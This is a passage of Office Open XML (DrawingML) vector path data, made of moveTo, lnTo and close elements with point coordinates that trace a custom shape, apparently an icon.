                  <a:lnTo>
                    <a:pt x="5320" y="12802"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="12839"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="12875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="13315"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="13205"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="11921"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="11848"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10528" y="13279"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10895" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="14599"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="13902"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="13792"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="13535"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="13279"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10639" y="12839"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10565" y="12875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="13352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="13462"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="13499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="13682"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="13902"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="14893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="14929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="14966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="14232"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="14012"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="12875"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="12839"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7997" y="14342"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8107" y="14489"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="14599"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="14746"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="14893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="15149"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="15296"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="15516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="15590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="15736"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="15113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="15076"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="14966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="14929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="14966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="14929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="14783"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="14599"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="14342"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="15150" y="15370"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="15150" y="15443"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15224" y="15480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="15516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="15736"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15004" y="15993"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14857" y="15626"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="15370"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7997" y="13902"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7887" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="14122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="14269"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="14599"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="14673"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="14746"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="14819"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="14929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="15113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="15590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="16103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="16177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="16213"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="16213"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="16177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="16030"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="15920"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="15736"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="15663"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="15553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="15406"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="15223"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="15076"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="14893"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="14709"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="14342"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="14159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="14049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="13902"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="14710" y="15736"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14747" y="15993"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="16250"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="16507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="16397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14307" y="15993"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="15956"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="15736"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="14123" y="16103"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14160" y="16397"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="16690"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13830" y="16873"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13720" y="16727"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="16433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="16103"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13426" y="16470"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13500" y="16727"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="16873"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="16984"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="17167"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="17057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12876" y="16873"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12839" y="16727"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="16470"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12583" y="16837"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12656" y="17094"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12803" y="17277"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="17460"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="17387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="17277"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="17167"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="17020"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12583" y="16837"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12032" y="17094"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11996" y="17240"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="17387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12106" y="17570"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="17644"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="17644"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11739" y="17497"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11666" y="17240"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="17094"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11446" y="17350"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11482" y="17607"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11519" y="17791"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11189" y="17901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="17937"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="17864"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="17827"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="17717"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="17607"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="17534"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11446" y="17350"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10639" y="17644"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10749" y="17791"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="17901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="17974"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="17974"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="18194"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="18121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="18121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="18157"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10162" y="17901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="17827"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="17644"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10272" y="440"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10455" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="550"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="990"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="1210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11886" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13060" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14857" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15187" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15407" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15334" y="13682"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15297" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15297" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15224" y="14379"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15187" y="14526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15004" y="14856"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14747" y="15149"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="15370"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="15590"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="15773"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13060" y="16140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="16470"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="17094"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="17424"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="17387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="17387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="17424"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="17460"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="17791"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="18121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="18304"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="18487"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="18524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="18524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="18451"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="18377"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="18231"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="18121"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="17974"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="17680"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="17387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="16507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="14819"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="845" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="6052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="478" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="5025"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="478" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="845" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="3888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="2017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="1100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="440"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9868" y="17937"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9868" y="17974"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="18157"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="18341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="18524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="18487"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="18341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="18231"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="18084"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="17937"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9098" y="18194"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9171" y="18414"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="18524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="18598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="18781"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="18708"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="18598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="18487"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="18341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="18194"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8254" y="18414"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8291" y="18561"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="18744"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="18928"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="19038"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="18964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="18928"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="18854"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="18818"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="18634"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="18561"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="18414"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5246" y="18818"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5430" y="18891"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="18928"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="18964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="19221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="19148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="19038"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="18928"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="18818"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7557" y="18634"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7557" y="18781"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="18928"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="19038"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="19148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="19184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="19294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="19184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="19074"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="18928"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="18781"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="18708"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="18634"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6604" y="18854"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6677" y="19111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="19221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="19331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="19331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="19258"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="19221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="19184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="19184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="19221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="19221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="19184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="19074"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="18928"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="18854"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10125" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9721" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="2274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="955" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="4915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="5245"/>
